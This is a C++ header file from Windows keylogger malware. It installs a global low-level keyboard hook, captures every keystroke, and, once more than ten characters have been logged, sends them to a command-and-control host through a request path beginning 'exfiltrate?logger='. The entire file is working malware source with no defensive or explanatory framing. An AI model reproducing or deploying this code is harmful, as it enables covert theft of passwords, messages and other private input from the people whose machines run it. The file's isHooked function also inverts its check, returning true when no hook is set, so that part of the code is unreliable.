#ifndef KEYBOARD_HOOK_H
#define KEYBOARD_HOOK_H
#pragma once
#include <Windows.h>
#include "Keys.h"
#include "C2.h"

C2 c2;
UTIL util;
HHOOK hook;
string logtext="";

LRESULT KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT kbdStruct;
	if (code >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			string key = Keys::TABLE[kbdStruct.vkCode];
			if (key == "") {
				key = "?";
			}

			if (kbdStruct.vkCode == VK_RETURN) {
				logtext += "\n";
			}

			if (kbdStruct.vkCode == VK_SPACE) {
				logtext += " ";
			}

			logtext += key;
			
			if (logtext.size() > 10) {
				string pathName = "exfiltrate?logger=" + logtext;

				c2.netsend(util.getC2Host(), pathName.c_str());
				logtext = "";
			}
		}
	}
	return CallNextHookEx(hook, code, wParam, lParam);
}

void setHook() {
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHookProc, NULL, 0);
}

void unhook() {
	UnhookWindowsHookEx(hook);
}

bool isHooked() {
	return (bool)(hook == NULL);
}

void keyLoop() {
	setHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

#endif   


